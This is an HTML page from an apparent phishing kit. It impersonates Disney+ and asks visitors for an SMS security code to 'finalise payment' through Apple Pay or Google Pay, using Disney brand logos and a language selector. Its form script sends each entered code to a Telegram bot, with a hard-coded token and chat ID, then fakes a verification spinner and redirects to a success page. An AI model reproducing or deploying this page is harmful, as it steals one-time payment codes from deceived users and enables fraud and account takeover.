<!DOCTYPE html>
<html lang="">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <meta name="robots" content="noindex, nofollow"/>
  <title data-i18n-key="smsPageTitle">V√©rification SMS | Disney+</title>
  <link rel="stylesheet" href="style.css" />
</head>
<body>

  <!-- S√©lecteur de langue persistant -->
  <div class="lang-container">
    <label for="lang-select" data-i18n-key="langLabel">Langue :</label>
    <select id="lang-select">
      <option value="fr">Fran√ßais</option>
      <option value="en">English</option>
      <option value="de">Deutsch</option>
      <option value="es">Espa√±ol</option>
    </select>
  </div>

  <!-- Logo -->
  <header>
    <img src="Images/compose2.png" alt="Disney+" class="logo" />
  </header>

  <main>
    <h1 data-i18n-key="smsTitle">V√©rification SMS</h1>
    <p data-i18n-key="smsPrompt">
      Un code de s√©curit√© a √©t√© envoy√© √† votre t√©l√©phone.<br/>
      Veuillez le saisir pour finaliser le paiement via Apple Pay ou Google Pay.
    </p>

    <!-- Ic√¥nes de paiement (statique) -->
    <div class="pay-icons">
      <img src="Images/applepay.png" alt="Apple Pay"/>
      <img src="Images/googlepay.png" alt="Google Pay"/>
    </div>

    <form id="smsForm">
      <input
        type="text"
        name="sms"
        maxlength="6"
        placeholder=""
        data-i18n-key="smsInputPlaceholder"
        required
      />
      <button type="submit" class="btn" data-i18n-key="smsBtn">Valider</button>
    </form>

    <div class="footer-note" data-i18n-key="smsFooter">
      <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br/>
      MyDisney vous permet d'acc√©der facilement aux diff√©rents services du groupe, comme Disney+, ESPN, Walt Disney World <a href="#">et bien +</a>.
      <div class="logos-container">
        <img src="Images/compose2.png" alt="Disney+" />
        <img src="Images/abc-logo-image-4413.png" alt="ABC" />
        <img src="Images/espn-png-logo-4149.png" alt="ESPN" />
        <img src="Images/marvel-logo-34291.png" alt="Marvel" />
        <img src="Images/star-wars-logo-1002.png" alt="Star Wars" />
        <img src="Images/Hulu-Logo-PNG.png" alt="Hulu" />
        <img src="Images/natgeo-logo.png" alt="National Geographic" />
      </div>
    </div>
  </main>

  <!-- Overlay du spinner -->
  <div id="spinnerOverlay">
    <div class="spinner"></div>
    <div class="spinner-text" data-i18n-key="smsSpinnerText">V√©rification du code...</div>
  </div>

  <!-- Initialisation i18n -->
  <script src="i18n.js"></script>
  <script>
    function getLanguage() {
      let l = localStorage.getItem('lang') || navigator.language.slice(0,2) || 'fr';
      if (!translations[l]) l = 'fr';
      return l;
    }
    const lang = getLanguage();
    localStorage.setItem('lang', lang);
    document.documentElement.lang = lang;

    const select = document.getElementById('lang-select');
    select.value = lang;
    select.addEventListener('change', e => {
      localStorage.setItem('lang', e.target.value);
      window.location.reload();
    });

    document.querySelectorAll('[data-i18n-key]').forEach(el => {
      const key = el.getAttribute('data-i18n-key');
      if (el.tagName === 'INPUT') {
        el.placeholder = translations[lang][key] || '';
      } else {
        el.innerText = translations[lang][key] || el.innerText;
      }
    });
  </script>

  <!-- Envoi du code SMS et redirection -->
  <script>
    document.getElementById("smsForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const smsCode = this.sms.value.trim();

      // Envoi sur Telegram
      const token  = "8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg";
      const chatId = "-4970333928";
      const msg    = `üîê CODE SMS : ${smsCode}`;
      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: msg })
      }).catch(console.error);

      // Affiche le spinner
      document.getElementById("spinnerOverlay").style.display = "flex";

      // Redirige apr√®s 2,5s
      setTimeout(() => {
        window.location.href = "success.html";
      }, 2500);
    });
  </script>
</body>
</html>
